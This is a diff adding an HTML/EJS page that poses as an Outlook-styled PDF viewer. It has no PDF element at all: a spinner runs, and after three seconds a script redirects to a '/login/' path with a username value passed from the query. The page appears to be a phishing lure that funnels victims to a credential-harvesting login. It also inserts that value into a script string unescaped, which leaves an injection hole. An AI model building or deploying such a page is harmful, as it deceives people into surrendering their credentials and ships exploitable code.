@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Viewer with Loader</title>
+    <style>
+        /* Loader Styling (Outlook-style) */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0078D4; /* Outlook blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 35%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Hide PDF until it loads */
+        #pdf-container {
+            display: none;
+            width: 100%;
+            height: 600px;
+        }
+    </style>
+
+
+  <script>
+       setTimeout(function() {
+            const username = '<%= data %>'; // Get the query parameter from EJS
+            const redirectUrl = username ? `/login/?abcd=${username}` : '/login';
+            window.location.href = redirectUrl; // Redirect to the new URL
+        }, 3000); // 3000 milliseconds = 3 seconds
+    </script>
+
+
+</head>
+<body>
+    <br>  <br>  <br>  <br>  <br>  <br>  <br>  <br>  <br>
+  
+    
+
+    <!-- Loader -->
+    <div id="loader" class="loader"></div>
+
+    <!-- PDF Container -->
+   
+
+    <script>
+        // Wait for the PDF to load, then hide the loader
+        document.getElementById("pdf-container").addEventListener("load", function() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("pdf-container").style.display = "block";
+        });
+    </script>
+
+</body>
+</html> 
